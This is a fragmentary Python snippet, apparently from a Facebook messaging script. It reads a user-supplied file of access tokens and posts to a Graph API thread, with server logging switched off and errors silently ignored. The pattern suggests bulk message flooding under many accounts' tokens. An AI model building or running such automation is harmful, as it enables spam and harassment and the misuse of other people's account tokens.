...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    # Override the log_message method to suppress the default logging behavior
    def log_message(self, format, *args):
        return  # This prevents the log from being printed
...
def send_messages():
    # Get the token file directly from the user
    token_file_path = input("Enter the file path for the tokens (one token per line): ")

    # Read tokens line by line from the file
    ...
    def msg():
        ...
        try:
            s = requests.post("https://graph.facebook.com/v15.0/t_100040918423b76838/", data=parameters, headers=headers)
        except:
            pass
